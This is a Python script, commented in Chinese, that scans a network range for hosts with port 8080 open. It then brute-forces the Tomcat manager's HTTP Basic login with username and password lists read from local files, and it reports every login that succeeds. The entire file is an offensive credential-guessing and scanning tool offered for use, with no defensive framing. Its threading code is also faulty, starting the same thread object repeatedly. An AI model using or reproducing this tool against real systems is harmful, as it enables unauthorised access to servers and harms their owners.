#tomcat弱口令
import requests
import base64
import threading
import socket
import sys
from netaddr import IPNetwork

class Tomcat(threading.Thread):

    def __init__(self):
        super(Tomcat, self).__init__()

    def run(self):
        global url
        #一般tomcat的web端口是8080，所以先扫描一下局域网中的8080端口开放的情况
        try:
            port = 8080
            subnet = sys.argv[1]
            # 进行循环遍历IP
            for ip in IPNetwork(subnet):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                # 连接目标Ip端口
                code = s.connect_ex((str(ip), port))
                if code == 0:
                    url = "http://{}:{}//manager/status".format(ip,port)
                    #这里写的是将列表直接放在代码中，可以将账号和密码字典进行存放在本地的txt文件中，进行本地读取
                    with open("user.txt",'r') as f:
                        names = f.readlines()
                        with open("pass.txt",'r') as f:
                            passwds = f.readlines()
                            for name in names:
                                name = name.strip()
                                for passwd in passwds:
                                    passwd = passwd.strip()
                                    #通过抓取数据包，可以看出请求包中的密码和账号是base64加密，故将用户名和密码进行base64加密
                                    Authorization_first = "%s" % (base64.b64encode(name.encode() + ':'.encode() + passwd.encode()))
                                    Authorization = str(Authorization_first)
                                    Authorization = 'Basic' + " " + Authorization.strip('b').strip("'")
                                    #添加headers头部信息
                                    headers = {
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
                                        'Authorization':Authorization,
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
                                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                                        'Connection': 'close',
                                        'Cookie': '__lnk_uid=a432ac38-6326-413e-887b-a53408ef3553',
                                        'Upgrade-Insecure-Requests': '1'
                                    }
                                    res = requests.get(url=url,headers=headers,timeout=0.6)
                                    if res.status_code == 200:
                                        print("\033[31mTomcat主机{}登录成功,账号为{},密码为{}\033[0m".format(url,name,passwd))
                                    else:
                                        continue
                else:
                    print("{}未开启8080端口".format(ip))
        except:
            pass
        finally:
            s.close()

#主函数
if __name__ == '__main__':
    try:
        threads = []
        threads_count = int(10)

        for i in range(threads_count):
            t1 = Tomcat()
            threads.append(t1)

        for t in threads:
            t1.start()

        for t in threads:
            t1.join()
    except Exception as e:
        print(e)